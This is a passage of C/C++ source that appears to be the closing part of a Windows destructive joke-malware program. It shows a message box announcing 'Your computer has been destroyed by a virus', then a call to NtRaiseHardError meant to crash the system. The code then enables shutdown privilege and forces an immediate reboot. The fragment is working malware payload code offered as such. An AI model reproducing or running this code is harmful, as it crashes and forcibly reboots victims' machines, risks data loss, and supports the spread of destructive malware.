			ULONG_PTR args[] = { (ULONG_PTR)"Your computer has been destroyed by a virus. Enjoy your new pc!!!" }; //credits to pankoza ;)
			NtRaiseHardError(0xC0000144, 1, 0, (PULONG)args, 6, &response);
			HANDLE token;
			TOKEN_PRIVILEGES privileges;

			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
}